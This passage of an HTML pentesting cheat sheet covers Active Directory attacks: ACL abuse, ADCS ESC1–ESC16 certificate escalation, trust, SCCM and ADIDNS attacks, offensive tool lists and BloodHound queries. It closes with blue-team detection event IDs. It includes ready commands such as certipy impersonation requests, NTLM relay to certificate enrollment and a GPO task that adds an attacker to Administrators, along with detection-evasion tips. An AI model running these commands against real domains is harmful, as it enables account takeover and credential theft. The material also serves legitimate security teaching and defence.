  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>Owns (Object Ownership)</h3><div class="card-sub">Owner of an AD object implicitly has WriteDACL &mdash; can grant yourself any permission</div><div class="card-body"><ul class="card-list"><li>Every AD object has an <strong>owner</strong> &mdash; the owner always has implicit <strong>WriteDACL</strong></li><li>This means ownership = ability to grant yourself FullControl, GenericAll, DCSync rights, etc.</li><li><strong>Chain</strong>: Owns object &rarr; WriteDACL &rarr; grant GenericAll &rarr; exploit (password reset / RBCD / Shadow Creds)</li><li><code class="tool">bloodyAD</code> get object target --attr nTSecurityDescriptor &mdash; check owner</li><li><strong>WriteOwner</strong> on an object lets you <em>change</em> the owner to yourself &rarr; then you have WriteDACL</li><li><code class="tool">owneredit.py</code> -action write -owner attacker -target victim</li><li><strong>BloodHound edge</strong>: <code>Owns</code> &mdash; often missed because it doesn't look like a direct attack path</li><li><strong>OPSEC</strong>: Changing ownership triggers Event 4662 &mdash; original owner may notice</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>WriteSPN (Targeted Kerberoasting)</h3><div class="card-sub">Write servicePrincipalName &rarr; make any account Kerberoastable</div><div class="card-body"><ul class="card-list"><li>If you have <strong>WriteProperty on servicePrincipalName</strong>, you can set an SPN on any user account</li><li>Any domain user can then request a TGS for that SPN &mdash; encrypted with the target's password hash</li><li><strong>Step 1</strong>: <code class="tool">bloodyAD</code> set object target servicePrincipalName -v 'MSSQLSvc/fake:1433'</li><li><strong>Step 2</strong>: <code class="tool">GetUserSPNs.py</code> -request -dc-ip DC domain/user:pass</li><li><strong>Step 3</strong>: Crack TGS hash offline with <code class="tool">hashcat</code> -m 13100 (RC4) or 19700 (AES)</li><li><strong>Step 4</strong>: Clean up &mdash; remove SPN to avoid detection</li><li><code class="tool">targetedKerberoast.py</code> automates the full flow (set SPN &rarr; request &rarr; remove SPN)</li><li><strong>OPSEC</strong>: Set and remove SPN quickly &mdash; long-lived fake SPNs are detectable</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag acl">ACL</span><h3>GPO Link / Write Abuse</h3><div class="card-sub">Write access on GPO object &rarr; modify policy &rarr; code execution on all linked hosts</div><div class="card-body"><ul class="card-list"><li>If you have <strong>GenericWrite / WriteDACL / GenericAll</strong> on a Group Policy Object (GPO)</li><li>Modify the GPO to push: scheduled tasks, startup scripts, registry keys, software installation</li><li><code class="tool">SharpGPOAbuse</code> --AddComputerTask --TaskName "Backdoor" --Author NT AUTHORITY\SYSTEM --Command cmd.exe --Arguments "/c net localgroup Administrators attacker /add" --GPOName "VulnGPO"</li><li><code class="tool">pyGPOAbuse.py</code> &mdash; Python alternative for Linux</li><li><strong>Impact</strong>: Every computer/user in the OU linked to the GPO gets the malicious policy</li><li><strong>GpLink abuse</strong>: If you can modify <code>gPLink</code> attribute on an OU, you can link your own GPO</li><li><strong>Timing</strong>: GPOs refresh every 90 minutes by default (or force with <code>gpupdate /force</code>)</li><li><strong>Detection</strong>: Event 5136 on GPO objects, monitor SYSVOL for unauthorized modifications</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== ADCS ==================== -->
<div class="section-header"><h2><span>//</span> ADCS <span class="red">Exploitation</span> &mdash; ESC1 through ESC16</h2><p class="section-desc">Active Directory Certificate Services provides the richest privilege escalation surface in modern AD. Every ESC explained individually.</p></div>

<div class="details-grid">
  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC1 &mdash; Misconfigured Template (SAN)</h3><div class="card-sub">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enroll</div><div class="card-body"><ul class="card-list"><li>Template allows user-supplied <strong>Subject Alternative Name</strong> (SAN)</li><li>Request cert with <code>-upn administrator@domain</code> &mdash; CA blindly issues it</li><li><code class="tool">certipy</code> req -ca CA -template VulnTemplate -upn administrator@domain</li><li><code class="tool">certipy</code> auth -pfx admin.pfx &rarr; NT hash via PKINIT</li><li><strong>Conditions</strong>: ENROLLEE_SUPPLIES_SUBJECT flag + Client Auth EKU + low-priv enrollment rights</li><li><strong>Mitigation</strong>: Remove ENROLLEE_SUPPLIES_SUBJECT, require CA manager approval</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(6,182,212,0.06);border-left:2px solid var(--cyan);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--cyan);">Why does this work?</strong> The flag lets the requester specify any SAN. The CA trusts the template config and issues a cert with the attacker-supplied identity. PKINIT accepts this cert as valid authentication for that user.</p></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC2 &mdash; Any Purpose / SubCA EKU</h3><div class="card-sub">Overly permissive EKU allows client authentication</div><div class="card-body"><ul class="card-list"><li>Template has <strong>Any Purpose</strong> (2.5.29.37.0) or <strong>SubCA</strong> EKU &mdash; both allow Client Authentication</li><li>SubCA certificates can issue subordinate certificates (extremely dangerous)</li><li><strong>Any Purpose</strong>: The certificate can be used for <em>anything</em> including client auth, code signing, etc.</li><li><code class="tool">certipy</code> req -ca CA -template VulnTemplate</li><li><strong>Difference from ESC1</strong>: No SAN control needed &mdash; the EKU itself is the problem</li><li><strong>Mitigation</strong>: Replace Any Purpose with specific EKUs, never grant SubCA to low-priv users</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC3 &mdash; Enrollment Agent Abuse</h3><div class="card-sub">Certificate Request Agent EKU &rarr; enroll on behalf of others</div><div class="card-body"><ul class="card-list"><li><strong>Step 1</strong>: Enroll in template with <strong>Certificate Request Agent</strong> EKU (OID 1.3.6.1.4.1.311.20.2.1)</li><li><strong>Step 2</strong>: Use that cert to co-sign enrollment requests on behalf of other users</li><li>Effectively enroll as any user in templates that require an enrollment agent</li><li><code class="tool">certipy</code> req -ca CA -template EnrollAgent &rarr; then use agent cert to request on behalf of DA</li><li><strong>Two templates needed</strong>: One with Request Agent EKU (you enroll) + one that accepts agent enrollment (target)</li><li><strong>Mitigation</strong>: Restrict enrollment agent templates, configure enrollment restrictions on CA</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC4 &mdash; Writable Template</h3><div class="card-sub">Write access on template object &rarr; modify to ESC1</div><div class="card-body"><ul class="card-list"><li>If you have <strong>WriteProperty / WriteDACL / WriteOwner</strong> on a certificate template AD object</li><li>Modify the template to enable ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU &rarr; becomes ESC1</li><li><code class="tool">certipy</code> template -u user -p pass -template VulnTemplate -save-old -alt-name administrator</li><li>After exploitation, restore template: <code class="tool">certipy</code> template -u user -p pass -template VulnTemplate -configuration old.json</li><li><strong>Detection</strong>: Event 5136 modifying certificate template objects in AD</li><li><strong>Mitigation</strong>: Audit and restrict write access on all certificate template objects</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC6 &mdash; EDITF_ATTRIBUTESUBJECTALTNAME2</h3><div class="card-sub">CA-level flag allows SAN in ANY template</div><div class="card-body"><ul class="card-list"><li>CA has <code class="vuln">EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag enabled on the CA itself</li><li>Allows SAN override on <strong>any template</strong> regardless of template settings</li><li>Effectively turns every template into ESC1</li><li><code class="tool">certipy</code> req -ca CA -template User -upn administrator@domain</li><li><strong>Largely patched</strong>: May 2022 patch requires ManageCA rights to exploit &mdash; but still found unpatched</li><li><strong>Mitigation</strong>: Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from CA config</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC7 &mdash; ManageCA / ManageCerts Permissions</h3><div class="card-sub">CA admin permissions = approve any certificate request</div><div class="card-body"><ul class="card-list"><li><strong>ManageCA</strong>: Can modify CA configuration, enable EDITF flag (ESC6), add officer permissions</li><li><strong>ManageCerts (Officer)</strong>: Can approve pending certificate requests</li><li><strong>Chain</strong>: ManageCA &rarr; add yourself as officer &rarr; submit request for admin cert &rarr; approve it yourself</li><li><code class="tool">certipy</code> ca -ca CA -add-officer attacker &mdash; then: <code class="tool">certipy</code> ca -ca CA -issue-request ID</li><li>With SubCA template: request SubCA cert &rarr; approve &rarr; now you can issue <em>any</em> certificate</li><li><strong>Mitigation</strong>: Restrict ManageCA/ManageCerts to dedicated PKI admins only</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC8 &mdash; NTLM Relay to Web Enrollment</h3><div class="card-sub">HTTP enrollment endpoint + coercion = relay</div><div class="card-body"><ul class="card-list"><li>ADCS web enrollment (<code>/certsrv/</code>) uses <strong>HTTP with NTLM auth</strong> &mdash; no signing</li><li>Coerce DC &rarr; relay NTLM to CA web enrollment &rarr; enroll as DC</li><li><code class="tool">ntlmrelayx</code> --target http://ca/certsrv/ --adcs --template DomainController</li><li>Get cert as DC &rarr; PKINIT &rarr; DCSync &rarr; all domain hashes</li><li><strong>Coercion</strong>: PetitPotam, PrinterBug, DFSCoerce &mdash; any method that forces DC auth to attacker</li><li><strong>Mitigation</strong>: Enable EPA on enrollment endpoints, use HTTPS, disable HTTP enrollment</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(6,182,212,0.06);border-left:2px solid var(--cyan);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--cyan);">Why does this work?</strong> HTTP has no signing mechanism. The CA accepts relayed NTLM auth as legitimate and issues a certificate to whoever authenticated &mdash; including a DC whose auth was relayed.</p></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC9 &mdash; No Security Extension (Template)</h3><div class="card-sub">CT_FLAG_NO_SECURITY_EXTENSION on template</div><div class="card-body"><ul class="card-list"><li>Template has <code class="vuln">CT_FLAG_NO_SECURITY_EXTENSION</code> flag &mdash; cert does not embed the requester's SID</li><li>Without the security extension, certificate-to-user mapping relies on <strong>UPN/DNS name only</strong></li><li><strong>Attack</strong>: If you can modify another user's UPN (GenericWrite) &rarr; change UPN to target &rarr; request cert &rarr; restore UPN &rarr; authenticate as target</li><li>The cert maps to whoever has that UPN at authentication time</li><li><strong>Requires</strong>: GenericWrite on target user + template without security extension</li><li><strong>Mitigation</strong>: Ensure templates include the security extension (szOID_NTDS_CA_SECURITY_EXT)</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC10 &mdash; Weak Certificate Mapping</h3><div class="card-sub">Registry controls how certificates map to accounts</div><div class="card-body"><ul class="card-list"><li>Two registry values control cert mapping strength:</li><li><code>StrongCertificateBindingEnforcement = 0</code> on DC &mdash; <span class="vuln">weak mapping accepted</span></li><li><code>CertificateMappingMethods</code> contains <code>0x4</code> (UPN mapping) &mdash; allows impersonation via UPN</li><li><strong>Attack (Case 1)</strong>: GenericWrite on user &rarr; change UPN &rarr; request cert &rarr; auth as that user</li><li><strong>Attack (Case 2)</strong>: GenericWrite on computer &rarr; change dNSHostName &rarr; request machine cert &rarr; auth as that machine</li><li><strong>Mitigation</strong>: Set StrongCertificateBindingEnforcement = 2, remove weak mapping methods</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC11 &mdash; NTLM Relay to RPC Enrollment</h3><div class="card-sub">Like ESC8 but via RPC (ICPR) instead of HTTP</div><div class="card-body"><ul class="card-list"><li>CA exposes enrollment via <strong>RPC (MS-ICPR)</strong> in addition to HTTP</li><li>If <code class="vuln">IF_ENFORCEENCRYPTICERTREQUEST = 0</code> &mdash; RPC enrollment accepts unencrypted NTLM</li><li>Coerce + relay to RPC enrollment endpoint &mdash; same result as ESC8</li><li><code class="tool">certipy</code> relay -ca CA -template DomainController</li><li><strong>Difference from ESC8</strong>: Targets RPC interface, not HTTP &mdash; relevant when HTTP enrollment is disabled</li><li><strong>Mitigation</strong>: Set IF_ENFORCEENCRYPTICERTREQUEST = 1, require encryption for RPC enrollment</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC13 &mdash; Issuance Policy &rarr; Group</h3><div class="card-sub">OID linked to AD group via issuance policy</div><div class="card-body"><ul class="card-list"><li>An <strong>issuance policy OID</strong> can be linked to an AD group via <code>msDS-OIDToGroupLink</code></li><li>When a cert with that policy is used for auth, the user is <strong>added to the linked group</strong> for that session</li><li>If the linked group is privileged (e.g., Domain Admins) &rarr; instant privilege escalation</li><li><strong>Requirements</strong>: Enrollment rights on template with the linked issuance policy</li><li><code class="tool">certipy</code> req -ca CA -template PolicyTemplate &rarr; auth with cert &rarr; gain group membership</li><li><strong>Mitigation</strong>: Audit msDS-OIDToGroupLink attributes, restrict enrollment on policy-linked templates</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC14 &mdash; Explicit Certificate Mapping</h3><div class="card-sub">altSecurityIdentities misconfiguration</div><div class="card-body"><ul class="card-list"><li>Certificate-to-account mapping stored in <code>altSecurityIdentities</code> attribute on user objects</li><li>If attacker can <strong>modify altSecurityIdentities</strong> on target &rarr; map their own cert to that account</li><li>Also abusable via weak mapping formats (Issuer+SerialNumber instead of SKI+SHA1)</li><li><strong>Attack</strong>: Request any cert &rarr; write its mapping to target's altSecurityIdentities &rarr; auth as target</li><li><strong>Requires</strong>: Write access on target's altSecurityIdentities attribute</li><li><strong>Mitigation</strong>: Restrict write access on altSecurityIdentities, use strong mapping formats</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span> <span class="tag privesc">NEW</span><h3>ESC15 (EKUwu) &mdash; Schema v1 App Policy</h3><div class="card-sub">CVE-2024-49019 &bull; Oct 2024 by TrustedSec</div><div class="card-body">Exploits <strong>Schema Version 1 templates</strong> where AD CS fails to validate Application Policy OIDs.<ul class="card-list"><li>Schema v1 templates (e.g. <code>WebServer</code>) don't validate Application Policy field</li><li>Inject <code>--application-policies "1.3.6.1.5.5.7.3.2"</code> (Client Auth) into request</li><li>App Policy <strong>overrides template EKU</strong> &mdash; turns WebServer cert into Client Auth</li><li><code class="tool">certipy</code> req --application-policies "Client Authentication" -template WebServer -upn admin</li><li><strong>Mitigation</strong>: Duplicate v1 templates as v2, remove unused v1 templates</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(6,182,212,0.06);border-left:2px solid var(--cyan);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--cyan);">Why does this work?</strong> Schema v1 templates predate Application Policy validation. AD CS does not validate the OID field &mdash; attackers inject Client Auth EKU into templates that only allow Server Auth. The injected policy overrides the template's intended EKU.</p></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">ADCS</span><h3>ESC16 &mdash; No Security Extension (CA-wide)</h3><div class="card-sub">Like ESC9 but enforced at the CA level</div><div class="card-body"><ul class="card-list"><li>CA is configured to <strong>not include the security extension</strong> in issued certificates (CA-wide setting)</li><li>Same impact as ESC9 but affects <strong>all templates</strong> on that CA, not just one</li><li>Certificates lack SID embedding &rarr; rely on UPN/DNS name mapping only</li><li><strong>Attack</strong>: Same as ESC9 &mdash; modify target UPN via GenericWrite &rarr; request cert &rarr; restore &rarr; auth</li><li><strong>Broader scope</strong>: Every template on this CA is vulnerable, not just flagged ones</li><li><strong>Mitigation</strong>: Enable security extension at CA level, ensure SID is embedded in all certs</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== TRUST, SCCM, ADIDNS ==================== -->
<div class="section-header"><h2><span>//</span> Trust <span class="yellow">Escalation</span> &bull; SCCM <span class="teal">Attacks</span> &bull; ADIDNS <span class="green">Poisoning</span></h2></div>

<div class="details-grid">
  <div class="detail-card border-yellow"><span class="tag trust">TRUST</span><h3>Child &rarr; Parent (3 methods)</h3><div class="card-sub">Domain trust is NOT a security boundary</div><div class="card-body"><ul class="card-list"><li><strong>raiseChild.py</strong>: One command &mdash; auto golden + ExtraSID -519</li><li><strong>Manual Golden + ExtraSID</strong>: Dump krbtgt &rarr; get SIDs &rarr; ticketer -extra-sid PARENT-519</li><li><strong>Trust Ticket</strong>: Extract trust key (PARENTDOMAIN$) &rarr; forge inter-realm TGT &rarr; works after krbtgt rotation</li><li><strong>Unconstrained Deleg</strong>: Coerce parent DC to child deleg host &rarr; steal TGT</li></ul></div></div>

  <div class="detail-card border-yellow"><span class="tag trust">TRUST</span><h3>Forest &rarr; Forest Lateral</h3><div class="card-sub">Cross-forest exploitation</div><div class="card-body"><ul class="card-list"><li><strong>Password reuse</strong>: Dump NTDS &rarr; spray hashes on external forest</li><li><strong>Foreign groups</strong>: Users from Forest A in Forest B groups</li><li><strong>SID History</strong>: If TREAT_AS_EXTERNAL &mdash; SID history attacks work across forests</li></ul></div></div>

  <div class="detail-card border-teal"><span class="tag sccm">SCCM</span><h3>SCCM Attack Matrix</h3><div class="card-sub">CRED &bull; ELEVATE &bull; EXEC &bull; TAKEOVER</div><div class="card-body"><ul class="card-list"><li><strong>CRED</strong>: NAA creds, task sequence secrets, PXE boot, collection variables</li><li><strong>ELEVATE</strong>: Client push coercion &rarr; relay | Site server NTLM relay</li><li><strong>EXEC</strong>: Deploy apps / run scripts on managed endpoints</li><li><strong>TAKEOVER</strong>: Relay to SMS Provider / MSSQL &rarr; full SCCM control</li><li><strong>Tools</strong>: <code class="tool">sccmhunter</code> &bull; <code class="tool">SharpSCCM</code> &bull; <code class="tool">SCCMSecrets.py</code> &bull; <code class="tool">pxethief</code></li></ul></div></div>

  <div class="detail-card border-lime"><span class="tag dns">ADIDNS</span><h3>ADIDNS Time Bombs &amp; Poisoning</h3><div class="card-sub">Any domain user can create DNS records by default</div><div class="card-body"><ul class="card-list"><li><strong>Time Bombs</strong>: Pre-register predictable future hostnames &rarr; MITM on domain join</li><li>Records stored as <code>dnsNode</code> objects &mdash; grouped by name, persist indefinitely</li><li><strong>Record Injection</strong>: <code class="tool">dnstool.py</code> add wildcard &rarr; catch unresolved names</li><li>Combine with <code class="tool">Responder</code> / <code class="tool">ntlmrelayx</code> for capture and relay</li><li>Target pre-created machine accounts without A records</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== KEY ATTRIBUTES ==================== -->
<div class="section-header"><h2><span>//</span> Key Attributes &amp; Tool Arsenal</h2></div>

<div class="data-flow-card"><h4>Critical AD Attributes for Pentesters</h4><pre>
<span class="comment">// Delegation</span>
<span class="key">userAccountControl</span>                       <span class="val">TRUSTED_FOR_DELEGATION</span>           <span class="comment">// Unconstrained (0x80000)</span>
<span class="key">userAccountControl</span>                       <span class="val">TRUSTED_TO_AUTH_FOR_DELEG</span>        <span class="comment">// Constrained w/ proto transition</span>
<span class="key">msDS-AllowedToDelegateTo</span>                 <span class="val">SPN list</span>                         <span class="comment">// Constrained delegation targets</span>
<span class="key">msDS-AllowedToActOnBehalfOfOtherIdentity</span> <span class="val">binary SD</span>                        <span class="comment">// RBCD &mdash; who can impersonate</span>

<span class="comment">// Credential &amp; Key Material</span>
<span class="key">msDS-KeyCredentialLink</span>                   <span class="val">binary blob</span>                      <span class="comment">// Shadow Credentials (WHfB key)</span>
<span class="key">ms-Mcs-AdmPwd</span>                            <span class="val">cleartext password</span>               <span class="comment">// LAPS password (legacy)</span>
<span class="key">servicePrincipalName</span>                     <span class="val">SPN list</span>                         <span class="comment">// Kerberoasting target</span>
<span class="key">userAccountControl</span>                       <span class="val">DONT_REQ_PREAUTH</span>                 <span class="comment">// AS-REP roastable (0x400000)</span>

<span class="comment">// ADCS</span>
<span class="key">msPKI-Certificate-Name-Flag</span>              <span class="val">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</span> <span class="comment">// ESC1 flag</span>
<span class="key">msPKI-Template-Schema-Version</span>            <span class="val">1</span>                                <span class="comment">// ESC15 target (v1 templates)</span>
<span class="key">altSecurityIdentities</span>                    <span class="val">certificate mapping</span>              <span class="comment">// Explicit cert-to-user binding</span>

<span class="comment">// Trust</span>
<span class="key">trustAttributes</span>                          <span class="val">FOREST_TRANSITIVE</span>                <span class="comment">// Forest trust flag</span>
<span class="key">trustAttributes</span>                          <span class="val">TREAT_AS_EXTERNAL</span>                <span class="comment">// SID history across forests</span>
<span class="key">sIDHistory</span>                               <span class="val">foreign SID list</span>                 <span class="comment">// Cross-domain privesc via SIDs</span>
</pre></div>

<div class="data-flow-card" style="margin-top:16px;"><h4>Essential Tool Arsenal</h4><pre>
<span class="key">ENUMERATION</span>
&#x251C;&#x2500;&#x2500; <span class="val">BloodHound</span> + <span class="val">SharpHound</span> / <span class="val">bloodhound-python</span>    <span class="comment">// AD graph mapping</span>
&#x251C;&#x2500;&#x2500; <span class="val">CrackMapExec</span> / <span class="val">netexec</span>                          <span class="comment">// Swiss army knife</span>
&#x251C;&#x2500;&#x2500; <span class="val">certipy find</span>                                     <span class="comment">// ADCS enum</span>
&#x251C;&#x2500;&#x2500; <span class="val">sccmhunter</span>                                       <span class="comment">// SCCM/MECM enum</span>
&#x2514;&#x2500;&#x2500; <span class="val">ldeep</span> / <span class="val">findDelegation.py</span>                         <span class="comment">// LDAP + delegation enum</span>

<span class="key">EXPLOITATION</span>
&#x251C;&#x2500;&#x2500; <span class="val">impacket</span> suite                                   <span class="comment">// getST, secretsdump, ntlmrelayx, ticketer, raiseChild</span>
&#x251C;&#x2500;&#x2500; <span class="val">certipy</span>                                          <span class="comment">// ADCS ESC1-16</span>
&#x251C;&#x2500;&#x2500; <span class="val">Rubeus</span>                                           <span class="comment">// Kerberos abuse (Windows)</span>
&#x251C;&#x2500;&#x2500; <span class="val">Coercer</span> / <span class="val">PetitPotam</span>                             <span class="comment">// Auth coercion</span>
&#x251C;&#x2500;&#x2500; <span class="val">dacledit.py</span> / <span class="val">owneredit.py</span>                       <span class="comment">// ACL abuse</span>
&#x251C;&#x2500;&#x2500; <span class="val">rbcd.py</span> / <span class="val">addcomputer.py</span>                         <span class="comment">// RBCD + machine accounts</span>
&#x251C;&#x2500;&#x2500; <span class="val">targetedKerberoast.py</span>                            <span class="comment">// GenericWrite &rarr; Kerberoast</span>
&#x251C;&#x2500;&#x2500; <span class="val">SharpSCCM</span> / <span class="val">SCCMSecrets.py</span>                       <span class="comment">// SCCM exploitation</span>
&#x2514;&#x2500;&#x2500; <span class="val">DonPAPI</span> / <span class="val">dploot</span>                                 <span class="comment">// DPAPI secrets</span>

<span class="key">POST-EXPLOITATION &amp; LATERAL MOVEMENT</span>
&#x251C;&#x2500;&#x2500; <span class="val">secretsdump.py</span>                                   <span class="comment">// DCSync / NTDS dump</span>
&#x251C;&#x2500;&#x2500; <span class="val">ticketer.py</span>                                      <span class="comment">// Golden / Silver / Trust tickets</span>
&#x251C;&#x2500;&#x2500; <span class="val">psexec / wmiexec / smbexec / atexec</span>              <span class="comment">// Remote exec</span>
&#x251C;&#x2500;&#x2500; <span class="val">SCShell</span>                                          <span class="comment">// Fileless lateral via service config (port 135 only)</span>
&#x251C;&#x2500;&#x2500; <span class="val">Mimikatz</span>                                         <span class="comment">// The classic (Windows)</span>
&#x251C;&#x2500;&#x2500; <span class="val">LaZagne</span> / <span class="val">goLazagne</span>                              <span class="comment">// All-in-one cached credential dumping</span>
&#x251C;&#x2500;&#x2500; <span class="val">incognito</span> / <span class="val">elevate_pid_bof</span>                      <span class="comment">// Token impersonation &amp; process token theft</span>
&#x2514;&#x2500;&#x2500; <span class="val">SweetPotato</span> / <span class="val">PrintSpoofer</span> / <span class="val">GodPotato</span>         <span class="comment">// SeImpersonate &rarr; SYSTEM</span>
</pre></div>

<div class="data-flow-card" style="margin-top:16px;"><h4>BloodHound Key Cypher Queries</h4><pre>
<span class="comment">// Unconstrained delegation (non-DC)</span>
<span class="type">MATCH</span> (c1:Computer)-[:MemberOf*1..]->(g:Group) <span class="type">WHERE</span> g.objectid <span class="type">ENDS WITH</span> '-516'
<span class="type">WITH COLLECT</span>(c1.name) <span class="type">AS</span> dcs
<span class="type">MATCH</span> (c2 {unconstraineddelegation:true}) <span class="type">WHERE NOT</span> c2.name <span class="type">IN</span> dcs <span class="type">RETURN</span> c2

<span class="comment">// Constrained delegation</span>
<span class="type">MATCH</span> p=(u)-[<span class="danger">:AllowedToDelegate</span>]->(c) <span class="type">RETURN</span> p

<span class="comment">// ACL abuse paths</span>
<span class="type">MATCH</span> p=(u)-[r1]->(n) <span class="type">WHERE</span> r1.isacl=true <span class="type">AND</span> u.admincount=false <span class="type">RETURN</span> p

<span class="comment">// Domain trusts</span>
<span class="type">MATCH</span> p=(n:Domain)-->(m:Domain) <span class="type">RETURN</span> p

<span class="comment">// Shortest path to DA</span>
<span class="type">MATCH</span> p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:<span class="danger">"DOMAIN ADMINS@DOMAIN.LOCAL"</span>}))
<span class="type">RETURN</span> p
</pre></div>

<!-- ==================== DETECTION / BLUE TEAM ==================== -->
<div class="section-header"><h2><span>//</span> Detection <span class="blue">/</span> Blue Team <span class="green">Indicators</span></h2><p class="section-desc">Key Windows Event IDs and detection strategies for the attacks described above. Essential for purple team exercises.</p></div>

<div class="data-flow-card"><h4>Critical Event IDs for AD Attack Detection</h4><pre>
<span class="key">EVENT ID    SOURCE                    WHAT IT DETECTS                                          ATTACK</span>
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
<span class="val">4768</span>        Security              TGT requested (AS-REQ)                                   <span class="comment">AS-REP Roasting (RC4, 0x17)</span>
<span class="val">4769</span>        Security              TGS requested                                            <span class="comment">Kerberoasting (RC4 encryption)</span>
<span class="val">4771</span>        Security              Kerberos pre-auth failed                                 <span class="comment">Password spray via Kerberos</span>
<span class="val">4625</span>        Security              Logon failure                                            <span class="comment">Password spray via NTLM</span>
<span class="val">4662</span>        Security              Operation on AD object                                   <span class="comment">DCSync (DS-Replication rights)</span>
<span class="val">4624</span>        Security              Successful logon (Type 3/10)                             <span class="comment">Lateral movement, PtH, PtT</span>
<span class="val">5136</span>        Security              Directory service object modified                        <span class="comment">ACL abuse, RBCD, Shadow Creds</span>
<span class="val">5137</span>        Security              Directory service object created                         <span class="comment">Machine account creation</span>
<span class="val">4742</span>        Security              Computer account changed                                <span class="comment">RBCD attribute modification</span>
<span class="val">4887</span>        Security              Certificate requested                                    <span class="comment">ADCS abuse (ESC1, ESC8, ESC15)</span>
<span class="val">4886</span>        Security              Certificate issued                                       <span class="comment">Rogue certificate issuance</span>
<span class="val">1102</span>        Security              Audit log cleared                                        <span class="comment">Anti-forensics / cover tracks</span>
<span class="val">7045</span>        System                New service installed                                    <span class="comment">psexec, service-based execution</span>
<span class="val">4104</span>        PowerShell            Script block logging                                    <span class="comment">Malicious PowerShell commands</span>
<span class="val">10</span>          Sysmon                Process access (LSASS)                                  <span class="comment">Credential dumping (Mimikatz)</span>
</pre></div>

<div class="details-grid">
  <div class="detail-card border-blue"><span class="tag recon">DETECTION</span><h3>Kerberos Attack Detection</h3><div class="card-sub">Roasting, ticket forgery, delegation abuse</div><div class="card-body"><ul class="card-list"><li><strong>Kerberoasting</strong>: Event 4769 with <code>Ticket Encryption Type = 0x17</code> (RC4) for service accounts</li><li><strong>AS-REP Roasting</strong>: Event 4768 with <code>Pre-Auth Type = 0</code> (no pre-auth) &mdash; monitor DONT_REQ_PREAUTH accounts</li><li><strong>Golden Ticket</strong>: TGT with unusual lifetime, logon events with no corresponding 4768</li><li><strong>Silver Ticket</strong>: Service access with no corresponding 4769 on DC &mdash; hardest to detect</li><li><strong>DCSync</strong>: Event 4662 with <code>DS-Replication-Get-Changes-All</code> from non-DC source</li><li><strong>Diamond Ticket</strong>: Legitimate 4768 but modified PAC &mdash; requires PAC inspection</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag lateral">DETECTION</span><h3>Lateral Movement Detection</h3><div class="card-sub">PtH, remote exec, relay</div><div class="card-body"><ul class="card-list"><li><strong>Pass-the-Hash</strong>: Type 3 logon (4624) with NtLmSsp as auth package &mdash; especially from unusual sources</li><li><strong>PsExec</strong>: Event 7045 (service install) + named pipe creation on target</li><li><strong>WMIExec</strong>: WMI activity from unexpected hosts &mdash; process creation under <code>wmiprvse.exe</code></li><li><strong>NTLM Relay</strong>: Authentication from IP that did not initiate the connection &mdash; source/dest mismatch</li><li><strong>RDP</strong>: Type 10 logon from unusual internal sources</li><li><strong>Honey tokens</strong>: Create decoy accounts with SPNs, DONT_REQ_PREAUTH, or high-value group memberships</li></ul></div></div>

